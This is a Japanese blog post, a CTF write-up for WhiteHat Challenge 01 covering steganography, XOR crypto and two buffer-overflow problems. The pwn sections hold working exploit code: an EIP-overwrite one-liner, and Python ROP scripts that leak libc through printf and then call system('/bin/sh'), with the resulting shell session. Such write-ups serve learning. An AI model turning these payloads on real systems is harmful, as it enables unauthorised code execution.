---
layout: post
title: WhiteHat Challenge 01 の write-up
categories: [ctf]
date: 2017-02-26 05:50:00 +0900
---

チーム Harekaze で [WhiteHat Challenge 01](https://wargame.whitehat.vn/) に参加しました。

最終的にチームで 140 点を獲得し、順位は 5 位 (得点 70 チーム中) でした。うち、私は 4 問を解いて 70 点を入れました。

以下、解いた問題の write-up です。

## [Forensics 20] For001

問題の zip を展開すると LSB.png という名前のファイルが出てきました。

stegsolve.jar で RGB の LSB を取ってみると、zip を抽出できました。Google ドキュメントで開いてみると

```
. .- ... -.-- ..-. --- .-. . -. ... .. -.-.
```

という文字列が出てきました。これをモールス符号としてデコードした `easyforensic` を指定のフォーマットに当てはめてサブミットすると正解でした。

```
WhiteHat{1f0aa393d3e5369f391c35a793bcf1178b8299a0}
```

## [Cryptography 20] Crypto002

暗号化された out.png と、この画像の暗号化に使われた encode.py が渡されます。

encode.py を見ると鍵が 8 バイトであると分かります。PNG の先頭 8 バイトは `\x89PNG\r\n\x1a\n` と決まっているので、これと out.png の先頭 8 バイトを xor すると鍵は `W3lld0n3` であると分かりました。

この鍵を使って out.png を復号すると、`Too_easy_right?` と書かれた画像が出てきました。

```
WhiteHat{5356be1427d77ea27062cb5417c887b01a019e11}
```

## [Pwnable 15] Pwn002

`AAAAAAAAAAAAABBBB` で EIP が 0x42424242 になります。

0x080484d4 にフラグを表示する処理があるようなので、`./Something_above $(python -c "import struct; print 'A' * 13 + struct.pack('<I', 0x080484d4)")` を実行すると `c0nGr4t!u_p4sS_th3_n0ob_lvl` と表示されました。

```
WhiteHat{1ca60d8ef1a80affa5d009a4b3fc97170f313f5e}
```

## [Pwnable 15] Pwn001

どんなバイナリか調べてみます。

```
$ file ./SimpleBoF
SimpleBoF: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=0c92b374bbf7ea63e314065b4c77dce0fe2d3e14, not stripped
$ checksec --file ./SimpleBoF
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```

リモートで `/proc/sys/kernel/randomize_va_space` を確認すると、ASLR が無効であると分かりました。関数のオフセットを調べて、直接 system を呼んでしまいましょう。

```
pwn001@pwn32:~$ ldd ./SimpleBoF
        linux-vdso.so.1 =>  (0x00007ffff7ffd000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c2e000)
        /lib64/ld-linux-x86-64.so.2 (0x0000555555554000)
pwn001@pwn32:~$ strings -a -tx /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
 17c8c3 /bin/sh
pwn001@pwn32:~$ gdb /lib/x86_64-linux-gnu/libc.so.6
gdb-peda$ p/x &system
$1 = 0x46590
gdb-peda$ p/x &printf
$2 = 0x54340
```

libc のベースアドレスを手に入れましょう。

```python
import struct

def p(x):
  return struct.pack('<Q', x)

addr_printf = 0x400450
addr_str = 0x400644
addr_pop_rdi = 0x400623
addr_pop_rsi_r15 = 0x400621
addr_got_printf = 0x601018
offset_printf = 0x41490

payload = ''
payload += 'A' * 40
payload += p(addr_pop_rdi)
payload += p(addr_str)
payload += p(addr_pop_rsi_r15)
payload += p(addr_got_printf)
payload += 'BBBBBBBB'
payload += p(addr_printf)

print payload
```

得られたアドレスから、

```python
import struct

def p(x):
  return struct.pack('<Q', x)

addr_pop_rdi = 0x400623
offset_system = 0x46590
offset_sh = 0x17c8c3
offset_printf = 0x54340

libc_base = 0x7ffff7a69340 - offset_printf

payload = ''
payload += 'A' * 40
payload += p(addr_pop_rdi)
payload += p(libc_base + offset_sh)
payload += p(libc_base + offset_system)

print payload
```

でシェルが起動できました。

```
pwn001@pwn32:~$ (python /tmp/.../s.py; cat) | ./SimpleBoF
Your input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA#@
ls
flag.txt  peda-master  SimpleBoF
ls -la
total 32
drwxr-x--- 3 root    pwn001 4096 Feb 23 10:51 .
drwxr-xr-x 8 root    root   4096 Feb 20 17:22 ..
-r--r----- 1 pwn001_ root     30 Feb 20 17:17 flag.txt
-rw-r--r-- 1 root    root     29 Feb 23 10:52 .gdbinit
drwxr-xr-x 3 root    root   4096 Feb 23 10:51 peda-master
-r-sr-x--- 1 pwn001_ pwn001 8575 Feb 20 16:10 SimpleBoF
cat flag.txt
Welcome To Exploitation World
```

```
WhiteHat{e00725f55dcf5b3483aff542e6ac18f5262fa27a}
```

## 感想

この他に Web 問が 2 問あったのですが、どちらも解けず。どうすればよかったのか気になります。
